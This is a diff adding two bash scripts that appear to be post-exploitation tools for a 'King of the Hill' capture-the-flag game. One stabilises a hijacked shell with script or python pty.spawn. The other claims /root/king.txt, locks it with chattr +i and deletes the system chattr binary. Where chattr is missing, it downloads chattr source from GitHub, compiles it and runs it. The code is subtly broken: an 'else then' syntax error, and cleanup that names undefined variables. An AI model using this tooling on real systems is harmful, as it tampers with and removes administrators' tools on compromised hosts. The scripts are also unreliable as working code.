@@ -1,0 +1,76 @@
+#!/bin/bash
+
+HAS_SCRIPT=$(which script)
+HAS_PYTHON=$(which python)
+HAS_PYTHON3=$(which python3)
+
+if [[ "$IS_STABILIZED" == "" ]];
+then
+
+export TERM=xterm
+
+if [[ "$HAS_SCRIPT" != "" ]];
+then
+script -qc /bin/bash
+IS_STABILIZED="true"
+
+elif [[ "$HAS_PYTHON" != "" ]];
+then
+python -c "import pty; pty.spawn('/bin/bash')"
+IS_STABILIZED="true"
+
+elif [[ "$HAS_PYTHON3" != "" ]];
+then
+python3 -c "import pty; pty.spawn('/bin/bash')"
+IS_STABILIZED="true"
+
+fi
+
+fi
+#!/bin/bash
+
+CHATTR_URL="https://github.com/brgl/busybox/raw/master/e2fsprogs/chattr.c"
+HAS_CHATTR=$(which chattr)
+HAS_GCC=$(which gcc)
+HAS_WGET=$(which wget)
+HAS_CURL=$(which curl)
+USERNAME="adophilus"
+KING_FILE_PATH="/root/king.txt"
+
+if [[ "$HAS_CHATTR" != "" ]];
+then
+
+	echo "$USERNAME" > "$KING_FILE_PATH"
+	$HAS_CHATTR +i "$KING_FILE_PATH"
+	rm "$HAS_CHATTR"
+
+elif [[ "$HAS_GCC" != "" ]];
+then
+
+	source_tmp_file=$(mktemp)
+	compiled_tmp_file=$(mktemp)
+
+	if [[ "$HAS_WGET" != "" ]];
+	then
+
+		wget "$CHATTR_URL" -O "$source_tmp_file"
+
+	elif [[ "$HAS_CURL" != "" ]];
+	then
+
+		curl "$CHATTR_URL" -o "$source_tmp_file"
+
+	else
+	then
+
+		exit
+
+	fi
+
+	gcc "$source_tmp_file" -o "$compiled_tmp_file"
+	$compiled_tmp_file -i "$KING_FILE_PATH"
+	echo "$USERNAME" > "$KING_FILE_PATH"
+	$compiled_tmp_file +i "$KING_FILE_PATH"
+	rm "$compiled_file_path" "$source_file_path"
+
+fi
